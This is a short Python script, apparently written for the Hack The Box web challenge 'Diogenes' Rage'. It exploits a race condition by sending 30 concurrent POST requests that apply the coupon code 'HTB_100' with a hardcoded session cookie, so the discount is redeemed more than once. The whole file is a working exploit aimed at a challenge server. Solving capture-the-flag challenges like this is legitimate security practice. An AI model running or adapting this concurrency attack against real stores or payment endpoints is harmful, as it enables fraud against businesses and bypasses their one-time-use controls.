# used for Challenge-Web-Diogenes' Rage

import requests;
from threading import Thread;

def session_concurrency():
    header={
        "Content-Type": "application/json",
        "Cookie": "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR5bGVyXzA1MWQ3ZGUxNmYiLCJpYXQiOjE2OTkxNzgwNjh9.Zja3KNmzXCCKOMhTviL4DU80HEVgAUTBqcR0_sxm52s;",
        "Connection": "keep-alive"
    }

    data={
        "coupon_code":"HTB_100"
    }

    returndata = requests.post(url="httP://142.93.32.153:32625/api/coupons/apply", headers=header, json=data)
    print(returndata)

if __name__ == "__main__":
    for x in range(30):
        thread = Thread(target=session_concurrency)
        thread.start()
